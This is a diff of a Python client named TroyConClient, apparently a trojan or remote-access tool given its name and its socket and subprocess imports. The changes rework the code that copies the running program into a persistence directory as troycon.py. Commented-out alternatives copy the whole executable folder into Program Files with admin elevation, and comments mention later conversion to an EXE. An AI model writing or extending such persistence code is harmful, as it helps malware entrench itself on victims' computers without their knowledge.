@@ -1,7 +1,8 @@
 import os
 import sys
 import socket
-# import shutil
+# Uncomment this section if you intend to use the shutil module.
+# import shutil 
 import subprocess
 import threading
 import time
@@ -130,14 +131,17 @@ class TroyConClient:
             try:
                 current_exe_path = os.path.abspath(sys.argv[0])
                 
+                # -----------------------------------------------------------------
+                # Used when the executable is not a standalone file and requires additional files or directories to run 
+                # Retrieve the directory of the currently running executable.
                 # current_exe_dir = os.path.dirname(current_exe_path)
+
+                # Extract the folder name of the current executable’s directory.
                 # folder_name = os.path.basename(current_exe_dir)
 
-                # Fix the destination path for the copied file within the current Persistence directory (persistence_dir)
-                # program_files = os.environ.get("ProgramFiles", r"C:\Program Files")
-                # dest_dir = os.path.join(program_files, folder_name)
-                
-                persistence_target_path = os.path.join(self.persistence_dir, 'troycon.py') # Don't use after converting to an EXE file.
+                # Build the destination path inside the Persistence directory
+                # where the entire executable folder will be copied.
+                # dest_dir = os.path.join(self.persistence_dir, folder_name)
 
                 # if not os.path.exists(dest_dir):
                 #     try:
@@ -161,7 +165,14 @@ class TroyConClient:
                 #         print(f"[Error] Failed to copy directory: {e}")
                 # else:
                 #     print("[*] dest_dir already exists. No admin elevation needed.")
+                # -----------------------------------------------------------------
 
+                #Path setup for copying the currently running file (current_exe_path) into the Persistence directory.
+                persistence_target_path = os.path.join(self.persistence_dir, 'troycon.py') # Don't use after converting to an EXE file.
+
+                # Option A (commented out): Use shutil.copy2 to copy the file while preserving metadata (e.g., timestamps).
+                # Option B (active code): Manually copy the file in binary mode.
+                # Use either method depending on your needs.
                 if not os.path.exists(persistence_target_path):
                     # if current_exe_path != persistence_target_path:
                     #     shutil.copy2(current_exe_path, persistence_target_path)
